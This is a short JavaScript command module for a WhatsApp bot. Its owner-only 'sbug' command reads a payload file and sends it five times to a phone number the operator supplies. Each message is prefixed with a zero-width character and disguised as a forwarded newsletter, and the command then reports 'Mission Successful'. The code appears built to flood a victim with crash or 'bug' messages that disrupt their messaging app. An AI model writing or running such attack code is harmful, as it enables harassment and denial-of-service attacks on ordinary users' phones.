const fs = require('fs');
const config = require('../../config');

module.exports = {
    name: "sbug",
    execute: async (conn, msg, args, { from, fancy, isOwner }) => {
        if (!isOwner) return;
        let target = args[0]?.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
        const payload = fs.readFileSync('./lib/payloads/sbug.text', 'utf-8');

        for (let i = 0; i < 5; i++) {
            await conn.sendMessage(target, { 
                text: "\u200B" + payload,
                contextInfo: { forwardedNewsletterMessageInfo: { newsletterJid: config.newsletterJid, newsletterName: "ɪɴꜱɪᴅɪᴏᴜꜱ ꜱᴛᴇᴀʟᴛʜ" } }
            });
        }
        await conn.sendMessage(conn.user.id, { text: fancy("🥀 Mission Successful: SBUG1 deployed.") });
    }
};
